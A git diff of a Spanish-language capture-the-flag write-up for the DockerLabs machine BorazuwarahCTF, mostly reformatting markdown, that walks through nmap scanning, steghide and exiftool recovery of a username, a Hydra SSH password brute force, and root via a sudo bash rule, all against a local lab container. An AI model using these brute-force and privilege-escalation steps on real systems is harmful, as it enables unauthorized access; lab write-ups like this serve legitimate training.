@@ -1,22 +1,30 @@
-# 🖥️ Writeup - BorazuwarahCTF 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# BorazuwarahCTF ​​
 
-> **Tags:** `Linux` `Web` `Steganography` `Steghide` `Exiftool` `Hydra` `Sudoers` 
+## 🖥️ Writeup - BorazuwarahCTF
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `Steganography` `Steghide` `Exiftool` `Hydra` `Sudoers`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip borazuwarahctf.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh borazuwarahctf.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 19:26 CEST
 Nmap scan report for 172.17.0.2
@@ -93,13 +102,13 @@ steghide extract -sf Untitled.jpeg
 ```
 
 Info:
+
 ```
 Enter passphrase: 
 wrote extracted data to "secreto.txt".
 ```
 
-Nos solicita una passphrase, pero la dejamos en blanco. 
-Aun así, conseguimos extraer información oculta de la imagen, que se guarda en un archivo `secreto.txt`.
+Nos solicita una passphrase, pero la dejamos en blanco. Aun así, conseguimos extraer información oculta de la imagen, que se guarda en un archivo `secreto.txt`.
 
 ```
 Sigue buscando, aquí no está to solución
@@ -109,13 +118,14 @@ sigue buscando en la imagen!!!
 
 Lo leemos y la pista nos indica que debemos buscar más información dentro de la propia imagen.
 
-Se me ocurre revisar los `metadatos` de la imagen. 
+Se me ocurre revisar los `metadatos` de la imagen.
 
-```bash 
+```bash
 exiftool Untitled.jpeg
 ```
 
 Info:
+
 ```
 ExifTool Version Number         : 13.25
 File Name                       : Untitled.jpeg
@@ -147,7 +157,7 @@ Megapixels                      : 0.207
 
 Encontramos un usuario válido en los metadatos: `borazuwarah`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Intentamos un ataque de `fuerza bruta` por `SSH` con este usuario.
 
@@ -156,6 +166,7 @@ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -174,7 +185,7 @@ Accedemos por SSH.
 ssh borazuwarah@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -183,6 +194,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for borazuwarah on bd1074449ef9:
     env_reset, mail_badpass,
@@ -196,11 +208,12 @@ User borazuwarah may run the following commands on bd1074449ef9:
 
 Comprobamos que el usuario `borazuwarah` puede ejecutar el binario `bash` con privilegios de cualquier usuario del sistema, incluido `root`. Por lo tanto, para escalar a `root` solo tendríamos que hacer lo siguiente.
 
-```bash 
+```bash
 sudo -u root /bin/bash
 ```
 
 Info:
+
 ```
 root@bd1074449ef9:/home/borazuwarah# whoami
 root
